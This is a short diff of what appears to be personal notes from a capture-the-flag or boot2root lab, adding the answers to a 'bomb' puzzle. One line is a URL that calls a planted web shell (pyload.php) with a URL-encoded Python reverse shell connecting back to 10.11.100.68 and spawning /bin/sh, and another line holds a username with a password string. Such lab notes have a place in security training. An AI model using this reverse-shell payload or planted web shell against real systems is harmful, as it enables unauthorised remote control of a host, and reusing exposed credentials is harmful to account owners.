@@ -89,3 +89,10 @@ thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135
 
 
 https://10.11.100.68/forum/templates_c/pyload.php/?cmd=export%20RHOST%3D%2210.11.100.68%22%3Bexport%20RPORT%3D3412%3Bpython%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27
+
+Public speaking is very easy.
+1 2 6 24 120 720
+1 b 214
+9
+opekmq
+4 2 6 3 1 5
